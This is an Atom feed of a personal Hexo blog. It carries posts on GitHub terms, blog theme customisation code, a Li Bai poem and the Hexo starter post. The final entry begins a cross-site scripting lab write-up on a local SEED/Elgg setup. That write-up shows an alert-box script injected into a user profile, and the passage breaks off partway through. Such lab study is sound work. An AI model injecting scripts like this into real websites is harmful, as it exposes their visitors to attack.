@@ -1,0 +1,359 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>SONGCI</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://yousite.com/"/>
+  <updated>2018-08-03T10:57:03.309Z</updated>
+  <id>https://yousite.com/</id>
+  
+  <author>
+    <name>songci</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Github入门术语</title>
+    <link href="https://yousite.com/2018/08/02/Github%E5%85%A5%E9%97%A8%E6%9C%AF%E8%AF%AD/"/>
+    <id>https://yousite.com/2018/08/02/Github入门术语/</id>
+    <published>2018-08-02T11:14:05.000Z</published>
+    <updated>2018-08-03T10:57:03.309Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>什么是Git</strong> </p><p>Git是一个版本控制系统（Version Control System），版本控制即记录一个或若干文件内容变化的情况。Git属于分布式版本控制系统，客户端提取文件时总是镜像的完整仓库。</p><p><strong>Repository</strong>  </p><p>仓库，储存项目的空间。建立项目之前需要建立仓库，一个项目对应一个仓库。</p><p><strong>Issues</strong>  </p><p>针对于项目bug，审查者提出的问题。or审查者希望项目增加新的特性，而提出的建议。</p><p><strong>Star</strong> </p><p>点赞，遇到一个较好项目时可以为其”点赞“，Star过的项目会保存到点赞者的”star“库中。</p><p><strong>Fork</strong>  </p><p>拉分支，若对一个项目感兴趣，并且希望基于该项目开发新功能时，开发者可以Fork此项目。Fork之后就复制一个完全相同的项目到开发者的github仓库中，此项目独立于原项目，有着独立的时间线。</p><p><strong>Pull Request</strong>  </p><p>提交请求，建立在Fork之上。Fork一个项目并进行完善之后，可以对原项目的拥有者提出Pull Request。</p><p><strong>Merge </strong> </p><p>合并，别人Fork你的项目，对其进行完善之后，若其提出Pull Request，此时你可以审查该请求。如果Pull Request内容满足你的要求，且未与原项目冲突，你可以选择将其合并到项目之中。</p><p><strong>Watch </strong></p><p>观察，若希望及时得到一个项目的更新通知，你可以Watch该项目</p><p><strong>Gist</strong></p><p>分享片段化的代码。<del>翻不出去，网络奇差</del></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;什么是Git&lt;/strong&gt; &lt;/p&gt;
+&lt;p&gt;Git是一个版本控制系统（Version Control System），版本控制即记录一个或若干文件内容变化的情况。Git属于分布式版本控制系统，客户端提取文件时总是镜像的完整仓库。&lt;/p&gt;
+&lt;p&gt;&lt;stro
+      
+    
+    </summary>
+    
+    
+      <category term="Github入门" scheme="https://yousite.com/tags/Github%E5%85%A5%E9%97%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>gallery-test</title>
+    <link href="https://yousite.com/2018/08/02/gallery-test/"/>
+    <id>https://yousite.com/2018/08/02/gallery-test/</id>
+    <published>2018-08-01T16:54:37.000Z</published>
+    <updated>2018-08-03T08:59:13.793Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="HEXO博客" scheme="https://yousite.com/categories/HEXO%E5%8D%9A%E5%AE%A2/"/>
+    
+    
+      <category term="开发实践" scheme="https://yousite.com/tags/%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>That boy</title>
+    <link href="https://yousite.com/2018/07/31/That-boy/"/>
+    <id>https://yousite.com/2018/07/31/That-boy/</id>
+    <published>2018-07-31T15:23:46.000Z</published>
+    <updated>2018-08-01T13:22:01.180Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg" alt=""></p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg" class="full-image"> </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://1024-1253939655.cos.ap
+      
+    
+    </summary>
+    
+    
+      <category term="音乐" scheme="https://yousite.com/tags/%E9%9F%B3%E4%B9%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>博客功能扩展</title>
+    <link href="https://yousite.com/2018/07/30/%E5%8D%9A%E5%AE%A2%E5%8A%9F%E8%83%BD%E6%89%A9%E5%B1%95/"/>
+    <id>https://yousite.com/2018/07/30/博客功能扩展/</id>
+    <published>2018-07-29T16:18:51.000Z</published>
+    <updated>2018-08-03T13:27:34.888Z</updated>
+    
+    <content type="html"><![CDATA[<p>任务清单（<code>todo list</code>）</p><ul><li style="list-style: none"><input type="checkbox" checked> 归档页</li><li style="list-style: none"><input type="checkbox" checked> 分类页</li><li style="list-style: none"><input type="checkbox" checked> 标签页</li><li style="list-style: none"><input type="checkbox" checked> 相册页 <code>2018年7月30日</code></li><li style="list-style: none"><input type="checkbox" checked> 搜索页 <code>2018年7月31日</code></li><li style="list-style: none"><input type="checkbox"> 时间页</li><li style="list-style: none"><input type="checkbox" checked> 安装hexo-related-popular-posts插件 <code>2018年8月1日</code></li><li style="list-style: none"><input type="checkbox"> 文章加密访问、前端加密类hexo-encrypt. / hexo-blog-encrypt（废弃的API，<u>放弃折腾</u>）</li><li style="list-style: none"><input type="checkbox"> hexo-pdf插件：pdf预览</li><li style="list-style: none"><input type="checkbox"> 返回顶部 <code>2018年8月3日</code></li><li style="list-style: none"><input type="checkbox"> 学习记录–使用 F12 开发人员工具调试 HTML 和 CSS、<a href="https://link.jianshu.com/?t=http%3A%2F%2Fwww.cnblogs.com%2Fzourong%2Fp%2F5020526.html" target="_blank" rel="noopener">https://link.jianshu.com/?t=http%3A%2F%2Fwww.cnblogs.com%2Fzourong%2Fp%2F5020526.html</a></li><li style="list-style: none"><input type="checkbox"> <a href="https://reuixiy.github.io/" target="_blank" rel="noopener">https://reuixiy.github.io/</a>  hexo next超赞博客</li></ul><p>前言</p><p>归档页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--&lt;%- list_posts(&#123;order: -1, amount: 1000&#125;) %&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 完全显示 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">var</span> <span class="attr">last</span>; %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">site.posts.sort</span>('<span class="attr">-date</span>')<span class="attr">.map</span>(<span class="attr">function</span>(<span class="attr">post</span>, <span class="attr">i</span>)&#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">var</span> <span class="attr">year</span> = <span class="string">post.date.year();</span> %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">last</span> != <span class="string">year)&#123;</span> %&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">last</span> != <span class="string">null)&#123;</span> %&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">%</span> <span class="attr">last</span> = <span class="string">year;</span> %&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%- url_for(config.archive_dir + '/' + year) %&gt;"</span> <span class="attr">class</span>=<span class="string">"archive-year"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">%=</span> <span class="attr">year</span> %&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"archives"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_partial</span>/<span class="attr">archive-post</span>', &#123;<span class="attr">post:</span> <span class="attr">post</span>, <span class="attr">even:</span> <span class="attr">i</span> % <span class="attr">2</span> == <span class="string">0,</span> <span class="attr">index:</span> <span class="attr">true</span>&#125;) %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125;) %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">site.posts.length</span>)&#123; %&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br></pre></td></tr></table></figure><p>分类页</p><p>标签页</p><p>标签云，加载效果不理想。<a href="http://www.netcan666.com/2015/12/15/Hexo%E4%B8%AA%E6%80%A7%E5%8C%96%E7%90%83%E5%BD%A2%E6%A0%87%E7%AD%BE%E4%BA%91/#7s8d6f87#7s8d6f87" target="_blank" rel="noopener">参考博客</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">js</span>(['<span class="attr">js</span>/<span class="attr">tagcanvas.js</span>'])%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tags"</span> <span class="attr">id</span>=<span class="string">"myTags"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">width</span>=<span class="string">"700px"</span> <span class="attr">height</span>=<span class="string">"400"</span> <span class="attr">id</span>=<span class="string">"my3DTags"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Anything in here will be replaced on browsers that support the canvas element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tags"</span> <span class="attr">id</span>=<span class="string">"tags"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">tagcloud</span>(&#123;</span></span><br><span class="line"><span class="tag">    <span class="attr">min_font:</span> <span class="attr">16</span>,</span></span><br><span class="line"><span class="tag">    <span class="attr">max_font:</span> <span class="attr">35</span>,</span></span><br><span class="line"><span class="tag">    <span class="attr">amount:</span> <span class="attr">999</span>,</span></span><br><span class="line"><span class="tag">    <span class="attr">color:</span> <span class="attr">true</span>,</span></span><br><span class="line"><span class="tag">    <span class="attr">start_color:</span> '<span class="attr">black</span>',</span></span><br><span class="line"><span class="tag">    <span class="attr">end_color:</span> '<span class="attr">red</span>',</span></span><br><span class="line"><span class="tag">&#125;) %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    window.onload = function() &#123;</span></span><br><span class="line"><span class="undefined">    try &#123;</span></span><br><span class="line"><span class="undefined">        TagCanvas.Start('my3DTags','tags',&#123;</span></span><br><span class="line"><span class="undefined">        textFont: 'Georgia,Optima',</span></span><br><span class="line"><span class="undefined">        textColour: null,</span></span><br><span class="line"><span class="undefined">        outlineColour: '#ff00ff',</span></span><br><span class="line"><span class="undefined">        weight: true,</span></span><br><span class="line"><span class="undefined">        reverse: true,</span></span><br><span class="line"><span class="undefined">        depth: 0.8,</span></span><br><span class="line"><span class="undefined">        maxSpeed: 0.05,</span></span><br><span class="line"><span class="undefined">        bgRadius: 1,</span></span><br><span class="line"><span class="undefined">        freezeDecel: true</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    &#125; catch(e) &#123;</span></span><br><span class="line"><span class="undefined">        // something went wrong, hide the canvas container</span></span><br><span class="line"><span class="undefined">        document.getElementById('myTags').style.display = 'none';</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><center><em>实现效果</em></center><video id="video" controls preload="none"><br><br>​    <source id="mp4" src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/tag.mp4"><br><br>​     <p>Your user agent does not support the HTML5 Video element.</p><br><br></video><p>相册页</p><p>搜索页</p><p><a href="http://www.hahack.com/codes/local-search-engine-for-hexo/" target="_blank" rel="noopener">参考博文</a></p><p>调整字体</p><h1 id="返回顶部"><a href="#返回顶部" class="headerlink" title="返回顶部"></a>返回顶部</h1><p>三个步骤：添加ejs文件、添加js文件、相应位置引入（<a href="http://www.lanrentuku.com/gif/a/top.html" target="_blank" rel="noopener">返回顶部图标下载</a>）</p><ul><li>添加ejs文价</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--totop.ejs--&gt;</span></span><br><span class="line"># totop&#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    bottom: 50px;</span><br><span class="line">    right: 30px;</span><br><span class="line">    cursor: pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"totop"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;%- config.root %&gt;img/totop.png"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>添加js文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//totop.js</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> upperLimit = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Our scroll link element</span></span><br><span class="line">    <span class="keyword">var</span> scrollElem = $(<span class="string">'#totop'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Scroll to top speed</span></span><br><span class="line">    <span class="keyword">var</span> scrollSpeed = <span class="number">500</span>;</span><br><span class="line">    scrollElem.hide();</span><br><span class="line">    $(<span class="built_in">window</span>).scroll(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> scrollTop = $(<span class="built_in">document</span>).scrollTop();</span><br><span class="line">        <span class="keyword">if</span> ( scrollTop &gt; upperLimit ) &#123;</span><br><span class="line">            $(scrollElem).stop().fadeTo(<span class="number">300</span>, <span class="number">1</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $(scrollElem).stop().fadeTo(<span class="number">300</span>, <span class="number">0</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    $(scrollElem).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">'html, body'</span>).animate(&#123;<span class="attr">scrollTop</span>:<span class="number">0</span>&#125;, scrollSpeed); <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)(jQuery);</span><br></pre></td></tr></table></figure><ul><li>相应位置引入</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_custom</span>/<span class="attr">totop</span>') %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&lt;%- config.root %&gt;js/totop.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>layout.ejs文件中引入（其他类似）</p><ul><li>相关问题</li></ul><p>返回顶部的速度太慢，修改totop.js文件中的变量即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Our scroll link element</span></span><br><span class="line"><span class="comment">//&lt;div id="totop"&gt;</span></span><br><span class="line"><span class="comment">//获取锚点</span></span><br><span class="line"><span class="keyword">var</span> scrollElem = $(<span class="string">'#totop'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Scroll to top speed</span></span><br><span class="line"><span class="comment">//滚动速度，值越小越快</span></span><br><span class="line"><span class="keyword">var</span> scrollSpeed = <span class="number">500</span>;</span><br></pre></td></tr></table></figure><p>更多实现方法，见于此<a href="https://www.jb51.net/article/91824.htm" target="_blank" rel="noopener">传送门</a></p><p>后记</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;任务清单（&lt;code&gt;todo list&lt;/code&gt;）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; 归档页&lt;/li&gt;
+&lt;li style=&quot;list-style: none&quot;&gt;
+      
+    
+    </summary>
+    
+      <category term="HEXO博客" scheme="https://yousite.com/categories/HEXO%E5%8D%9A%E5%AE%A2/"/>
+    
+    
+      <category term="开发实践" scheme="https://yousite.com/tags/%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>李白诗选</title>
+    <link href="https://yousite.com/2018/07/26/%E6%9D%8E%E7%99%BD%E8%AF%97%E9%80%89/"/>
+    <id>https://yousite.com/2018/07/26/李白诗选/</id>
+    <published>2018-07-26T15:58:02.000Z</published>
+    <updated>2018-08-03T09:06:30.449Z</updated>
+    
+    <content type="html"><![CDATA[<p>《宣州谢朓楼饯别校书叔云 》<code>李白</code></p><p>弃我去者，昨日之日不可留;  </p><p>乱我心者，今日之日多烦忧。  </p><p>长风万里送秋雁，对此可以酣高楼。  </p><p>蓬莱文章建安骨，中间小谢又清发。  </p><p>俱怀逸兴壮思飞，欲上青天揽明月。  </p><p>抽刀断水水更流，举杯销愁愁更愁。  </p><p>人生在世不称意，明朝散发弄扁舟。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;《宣州谢朓楼饯别校书叔云 》&lt;code&gt;李白&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;弃我去者，昨日之日不可留;  &lt;/p&gt;
+&lt;p&gt;乱我心者，今日之日多烦忧。  &lt;/p&gt;
+&lt;p&gt;长风万里送秋雁，对此可以酣高楼。  &lt;/p&gt;
+&lt;p&gt;蓬莱文章建安骨，中间小谢又清发。  &lt;/p&gt;
+&lt;p&gt;俱怀
+      
+    
+    </summary>
+    
+      <category term="唐诗选抄" scheme="https://yousite.com/categories/%E5%94%90%E8%AF%97%E9%80%89%E6%8A%84/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>宋词选抄</title>
+    <link href="https://yousite.com/2018/07/26/%E5%AE%8B%E8%AF%8D%E9%80%89%E6%8A%84/"/>
+    <id>https://yousite.com/2018/07/26/宋词选抄/</id>
+    <published>2018-07-26T15:57:45.000Z</published>
+    <updated>2018-08-01T14:04:41.304Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>秦时明月</title>
+    <link href="https://yousite.com/2018/07/25/%E7%A7%A6%E6%97%B6%E6%98%8E%E6%9C%88/"/>
+    <id>https://yousite.com/2018/07/25/秦时明月/</id>
+    <published>2018-07-25T15:57:16.000Z</published>
+    <updated>2018-07-25T15:57:16.187Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>That girl</title>
+    <link href="https://yousite.com/2018/07/25/That-girl/"/>
+    <id>https://yousite.com/2018/07/25/That-girl/</id>
+    <published>2018-07-24T16:35:51.000Z</published>
+    <updated>2018-08-03T07:34:39.141Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg" alt="这是一个test页"></p><a id="more"></a>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://1024-1253939655.cos.ap-beijing.myqcloud.com/hexo_poem/poem.jpg&quot; alt=&quot;这是一个test页&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="音乐" scheme="https://yousite.com/tags/%E9%9F%B3%E4%B9%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://yousite.com/2018/07/24/hello-world/"/>
+    <id>https://yousite.com/2018/07/24/hello-world/</id>
+    <published>2018-07-23T16:27:31.948Z</published>
+    <updated>2018-07-18T13:52:14.930Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+      <category term="建站笔记" scheme="https://yousite.com/categories/%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>跨站脚本攻击</title>
+    <link href="https://yousite.com/2018/07/18/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
+    <id>https://yousite.com/2018/07/18/跨站脚本攻击/</id>
+    <published>2018-07-18T11:36:03.000Z</published>
+    <updated>2018-07-18T13:34:58.569Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一、环境说明"><a href="#一、环境说明" class="headerlink" title="一、环境说明"></a>一、环境说明</h1><p>虚拟环境：SEEDUbuntu16.04+VirtualBox</p><p>攻击网站：XSS Site</p><p>环境搭建：配置步骤见于《作业报告》的参考资料[8]，即分别下载虚拟机VirtualBox和操作系统SEEDUbuntu16.04，按照参考资料[8]进行安装即可。最后搭建的虚拟环境截图如下：</p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/1.png" alt=""></p><p>​    </p><p>网站搭建：搭建及配置步骤见于《作业报告》的参考资料[9]。最后搭建的攻击网站截图如下：     <img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/2.png" alt="img"></p><p>​    <center> <em>XSSSite主页</em></center></p><h1 id="二、初步攻击"><a href="#二、初步攻击" class="headerlink" title="二、初步攻击"></a>二、初步攻击</h1><h2 id="2-1直接注入脚本"><a href="#2-1直接注入脚本" class="headerlink" title="2.1直接注入脚本"></a>2.1直接注入脚本</h2><p>攻击者：alice</p><ul><li>开启apache服务器</li></ul><p>sudo service apache2 start</p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/3.png" alt="img"></p><ul><li>访问Elgg并以alice身份登入</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/4.png" alt="img"></p><ul><li>修改alice的profile并注入script</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'You are attacked by XSS! This is only a test.'</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/5.png" alt="img"></p><ul><li>alice退出，boby身份登入并访问alice的profile（Groups中搜索alice）</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/6.png" alt="img"></p><center>alice编辑简介，保存后的页面</center><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/7.png" alt="img"></p><center>boby访问alice的profile的页面</center><h2 id="2-2间接注入脚本"><a href="#2-2间接注入脚本" class="headerlink" title="2.2间接注入脚本"></a>2.2间接注入脚本</h2><p>攻击者：报告人</p><ul><li>配置DN，即修改/etc/hosts文件</li></ul><p>为<em><a href="http://www.example.com" target="_blank" 